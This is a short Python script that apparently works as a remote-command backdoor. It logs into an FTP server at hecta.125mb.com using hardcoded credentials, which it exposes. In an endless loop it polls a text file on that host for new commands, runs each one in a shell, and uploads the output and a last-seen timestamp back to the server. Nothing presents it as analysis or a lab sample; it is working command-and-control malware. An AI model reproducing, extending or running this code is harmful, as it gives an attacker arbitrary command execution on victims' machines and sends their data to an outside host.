def main():
    z=[]
    y=[]
    with open("last_seen.txt","w") as lseen:
        lseen.write(datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
    file_to_sendy=open("last_seen.txt","rb")
    ftp.storlines('STOR '+'last_seen.txt',file_to_sendy)
    
    original_cmd=urlopen('http://hecta.125mb.com/mila.txt')
    for kk in original_cmd:z.append(kk.strip())
    time.sleep(2)
    new_cmd=urlopen('http://hecta.125mb.com/mila.txt')
    for kk in new_cmd:y.append(kk.strip())
    
    if y != z:
        for to_exec in urlopen('http://hecta.125mb.com/mila.txt'):
            to_exec=to_exec.strip()
            to_exec=str(to_exec.decode("utf-8"))
            print(to_exec)
            #os.system(to_exec)
            print('executed')
    ##        result = subprocess.run([to_exec, '-l'], stdout=subprocess.PIPE)
    ##        output=str(result.stdout.decode('utf-8'))
            #print(output)
            try:
                output=check_output(to_exec, shell=True).decode('utf-8', errors='replace')
            except Exception as e:
                try:
                    output=check_output(to_exec, shell=True).decode('cp866', errors='replace')
                except Exception:
                    pass
            output=output.strip()
            print(output)
            msg = output
            if output=='':msg='completed'
            with open("output.txt",'w') as file_out:
                for cv in output:
                    file_out.write(str(cv))
            file_to_sendx=open("output.txt","rb")
            ftp.storlines('STOR '+'output.txt',file_to_sendx)
            
    else:
        print("gotten nothing")

if __name__=='__main__':
    import ftplib
    import subprocess
    from subprocess import check_output
    import os
    import urllib
    from urllib.request import urlopen
    import time
    from datetime import datetime
    
    while True:
        try:
            ftp=ftplib.FTP('hecta.125mb.com')
            ftp.login("2336040_opon","Black11060")
            print("completomento")
            break
        except Exception as pdfer:
            print("erroniuos")
            
    #data = urlopen(target_url)
    while True:
        try: 
            main()
        except Exception as pty:
            print(pty)
